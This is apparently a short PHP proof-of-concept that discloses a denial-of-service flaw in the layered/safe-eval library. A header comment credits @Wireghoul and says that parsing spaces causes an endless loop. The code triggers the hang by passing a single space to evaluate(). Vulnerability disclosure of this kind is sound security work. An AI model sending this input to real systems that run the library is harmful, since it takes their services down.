<?php
/* Safe eval Denial of Service
 * by @Wireghoul - justanotherhacker.com
 *
 * https://packagist.org/packages/layered/safe-eval 
 * https://github.com/AndreiIgna/safe-eval 
 *
 * Parsing spaces causes endless loops
 */

namespace Layered\SafeEval;
 
require ("SafeEval.php");
 
$se = new SafeEval;
 
var_dump($se->evaluate(' '));
?>
